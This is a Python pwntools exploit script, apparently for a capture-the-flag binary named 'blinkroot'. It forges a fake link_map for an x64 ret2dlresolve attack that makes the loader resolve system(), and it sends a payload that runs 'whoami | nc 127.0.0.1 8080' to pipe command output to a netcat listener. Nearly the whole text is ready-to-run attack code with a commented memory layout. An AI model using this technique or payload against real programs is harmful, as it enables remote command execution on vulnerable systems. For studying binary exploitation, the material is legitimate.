from pwn import *
context.terminal=["tmux","splitw","-h"]
io = process("blinkroot")
elf = ELF("blinkroot")
libc = ELF("./libc.so.6")

def ret2dlresolve_with_fakelinkmap_x64(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr):
    '''
    elf: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap
    
    known_function_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']
    
    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute
    
    WARNING: assert *(known_function_ptr-8) & 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o & 0x3
    
    WARNING: be careful that fake_linkmap is 0x100 bytes length   

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1

    linkmap:
        0x00: l_addr = offset_of_two_addr
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
        0x08: 17, tag of the JMPREL
        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x18
        0x18: padding for the relocation entry of idx=0
        0x20: padding for the relocation entry of idx=0
        0x28: padding for the relocation entry of idx=0
        0x30: p_r_offset, offset pointer to the resloved addr
        0x38: r_info
        0x40: append    
      resolved addr
        0x48: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x50
        0x50: 6, tag of the DT_SYMTAB
        0x58: known_function_ptr-8, p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0x50
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x8
    '''
    plt0 = elf.get_section_by_name('.plt').header.sh_addr

    linkmap = p64(offset_of_two_addr & (2**64 - 1))
    linkmap += p64(17) + p64(fake_linkmap_addr + 0x18)
    linkmap += p64(0)*3
    # here we set p_r_offset = fake_linkmap_addr + 0x48 - two_offset
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr
    linkmap += p64((fake_linkmap_addr + 0x48 - offset_of_two_addr)
                   & (2**64 - 1)) + p64(0x7) + p64(0)
    linkmap += p64(0)
    linkmap += p64(6) + p64(known_function_ptr-8)

    linkmap = linkmap.ljust(0x68, 'A')

    linkmap += p64(fake_linkmap_addr)

    linkmap += p64(fake_linkmap_addr + 0x50)

    linkmap = linkmap.ljust(0xf8, 'A')
    linkmap += p64(fake_linkmap_addr + 8)

    return linkmap

# .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
# .got.plt:0000000000600B48 qword_600B48    dq 0    
target_addr = 0x600B40
data_addr = 0x600BC0
offset = target_addr-data_addr
payload = p64(offset & (2**64 - 1))
payload += p64(data_addr+43)
payload += "whoami | nc 127.0.0.1 8080\x00"

payload +=ret2dlresolve_with_fakelinkmap_x64(elf,data_addr+len(payload), elf.got["__libc_start_main"],libc.sym["system"]-libc.sym["__libc_start_main"])
payload = payload.ljust(1024,'A')
# gdb.attach(io)
io.send(payload)
io.interactive()